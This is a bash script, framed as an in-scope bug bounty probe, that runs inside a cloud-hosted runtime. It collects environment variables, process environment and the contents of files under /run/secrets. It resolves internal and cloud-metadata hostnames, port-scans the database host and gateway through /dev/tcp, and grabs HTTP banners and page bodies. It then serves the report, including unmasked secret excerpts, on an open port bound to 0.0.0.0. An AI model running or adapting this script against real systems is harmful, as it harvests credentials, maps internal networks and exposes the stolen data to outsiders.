#!/bin/bash
# H8 internal-service identification probe. In-scope: positively identify internal services
# reachable from the Runtime perimeter + minimal proof of access. Targeted, low-volume.
mkdir -p /results
OUT=/results/index.html
{
echo "<pre>"
echo "=== H8 INTERNAL SERVICE PROBE $(date -u) ==="
echo "HOSTNAME: $(hostname)"
echo "=== ENV (secrets masked) ==="
env | sort | sed -E 's/(PASSWORD|PASS|SECRET|TOKEN|KEY)=.*/\1=<masked>/'
echo
echo "=== /proc/1/environ ==="
cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | sort | sed -E 's/(PASSWORD|PASS|SECRET|TOKEN|KEY)=.*/\1=<masked>/'
echo
echo "=== /run/secrets ==="
ls -la /run/secrets/ 2>/dev/null; for f in /run/secrets/*; do [ -f "$f" ] && echo "$f (120ch): $(head -c 120 "$f")"; done 2>/dev/null
echo
echo "=== NETWORK ==="
ip addr 2>/dev/null; ip route 2>/dev/null; cat /etc/resolv.conf 2>/dev/null
GW=$(ip route 2>/dev/null | awk '/default/{print $3; exit}')
echo "GATEWAY: $GW"
echo
echo "=== DNS RESOLUTION ==="
for h in gk-bypass-test-bugcrowdninja-570b.e.aivencloud.com falcon-bug-bounty-flag-pgsql-dev-sandbox.e.aivencloud.com api.aiven.io console.aiven.io kubernetes.default.svc.cluster.local metadata.google.internal instance-data; do
  echo "--- $h ---"; dig +short "$h" 2>/dev/null | head -5
done
echo
DBH=$(echo "$DATABASE_URL" | sed -E 's#.*@([^:/]+).*#\1#')
echo "DB host from DATABASE_URL: $DBH"
for H in "$DBH" "$GW"; do
  [ -z "$H" ] && continue
  IP=$(dig +short "$H" 2>/dev/null | grep -E '^[0-9]+\.' | tail -1); [ -z "$IP" ] && IP="$H"
  echo "=== TARGETED SERVICE ID on $H ($IP) ==="
  for p in 80 443 8080 8443 5432 6432 9090 9100 2379 6379 15672 8500 10250; do
    timeout 2 bash -c "echo > /dev/tcp/$IP/$p" 2>/dev/null && echo "OPEN $IP:$p"
  done
  for p in 80 443 8080 8443 9090 8500 15672; do
    scheme=http; { [ "$p" = 443 ] || [ "$p" = 8443 ]; } && scheme=https
    hdr=$(timeout 4 curl -sk -m 4 "$scheme://$IP:$p/" -D - -o /tmp/b 2>/dev/null | head -20)
    if [ -n "$hdr" ]; then echo "--- HTTP $scheme://$IP:$p/ ---"; echo "$hdr"; echo "body200: $(head -c 200 /tmp/b)"; fi
  done
done
echo
echo "=== DONE $(date -u) ==="
echo "</pre>"
} > "$OUT" 2>&1
cd /results && exec python3 -m http.server 8080 --bind 0.0.0.0
